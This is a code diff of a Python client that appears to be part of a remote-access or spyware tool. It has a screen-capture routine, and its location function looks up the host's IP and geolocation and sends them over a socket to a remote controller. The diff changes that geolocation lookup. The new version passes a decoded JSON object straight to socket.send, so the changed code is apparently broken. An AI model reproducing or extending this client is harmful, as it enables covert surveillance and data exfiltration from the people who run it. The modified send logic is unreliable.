@@ -6,7 +6,7 @@ from mss import mss
 from requests import get
 import os
 import json
-from urllib2 import urlopen
+import requests
 #asd
 def screen(client_socket):
     message = ".img"
@@ -107,16 +107,8 @@ def start_client():
 import re
 
 def location(client_socket):
-    url = 'http://ipinfo.io/json'
-    response = urlopen(url)
-    data = json.load(response)
+    message = requests.get("https://geolocation-db.com/json/39.110.142.79&position=true").json()
+    client_socket.send(message)
 
-    IP=data['ip']
-    org=data['org']
-    city = data['city']
-    country=data['country']
-    region=data['region']
-    message = 'IP : {4} \nRegion : {1} \nCountry : {2} \nCity : {3} \nOrg : {0}'.format(org,region,country,city,IP)
-    client_socket.send(message.encode('utf-8'))
 if __name__ == "__main__":
   start_client()
